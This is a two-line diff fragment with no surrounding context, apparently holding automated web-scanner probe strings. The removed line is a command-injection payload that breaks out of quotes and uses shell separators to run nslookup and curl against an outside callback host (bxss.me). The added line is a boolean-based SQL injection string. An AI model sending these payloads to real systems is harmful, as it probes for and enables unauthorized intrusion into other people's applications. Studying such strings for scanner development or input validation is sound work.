@@ -1,1 +1,1 @@
-&(nslookup -q=cname hitynexqdwohvccced.bxss.me||curl hitynexqdwohvccced.bxss.me)&'\"`0&(nslookup -q=cname hitynexqdwohvccced.bxss.me||curl hitynexqdwohvccced.bxss.me)&`'
+-1' OR 3*2>(0+5+876-876) -- 
